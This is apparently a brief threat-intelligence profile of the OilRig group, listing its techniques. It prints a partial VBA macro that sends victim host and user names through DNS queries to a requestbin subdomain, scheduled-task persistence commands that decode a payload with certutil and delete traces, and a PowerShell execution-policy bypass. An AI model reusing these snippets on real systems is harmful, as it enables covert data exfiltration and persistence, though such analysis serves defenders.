# OilRig

## Features

1. Use malicious macros with DNS tunnel to confirm the current execution stage and identify victim information.

```C
Sub Document_open()
       Randomize
       hostname = LCase(Environ("computername"))
       hostname = Mid(hostname, Len(hostname) - 3, 4)
       username = Mid(LCase(Environ("username")), 1, 3)
       domain = "[Subdomain].requestbin.net"
       Call DnsQuery(myDomain(1)，DNS_TYPE_A, 0, 0, 0, 0)
```

2. The delivered backdoor file will first collect the basic information of the victim's computer, and then calculate a 4-byte victim identifier based on the user name, computer name, and domain of the system environment for subsequent C2 communication.

3. The ISMinjector Trojan will create two scheduled tasks during persistence.

```bash
SchTasks /Create /SC MINUTE /MO 4 /TN \"ReportHealth\" /TR \"%localappdata%\\srvHealth.exe\" /f
//Run every 4 minutes srvHealth.exe
SchTasks /Create /SC MINUTE /MO 2 /TN \"LocalReportHealth\" /TR \"cmd.exe /c certutil -decode %localappdata%\\srvBS.txt %localappdata%\\srvHealth.exe && schtasks /DELETE /tn LocalReportHealth /f && del %localappdata%\\srvBS.txt\""
//Run every 2 minutes, Certil copies the payload in srvBS.txt to srvHealth.exe and deletes the source file
```

4. The BondUpdater Trojan will download two files when the victim enables the macro of the phishing document:

>	C:\ProgramData\WindowsAppPool\AppPool.vbs

>	C:\ProgramData\WindowsAppPool\AppPool.ps1

Macro by executing:wscript C:\ProgramData\WindowsAppPool\AppPool.vbs,Command to create a scheduled task as:cmd.exe /C schtasks /create /F /sc minute /mo 1 /tn "\WindowsAppPool\AppPool" /tr "wscript /b "C:\ProgramData\WindowsAppPool\AppPool.vbs""，make its BondUpdater contain persistence.
After creating the scheduled task, it will pass:PowerShell.exe -exec bypass -file C:\ProgramData\WindowsAppPool\AppPool.ps1，use C2 communication with DNS tunnel.
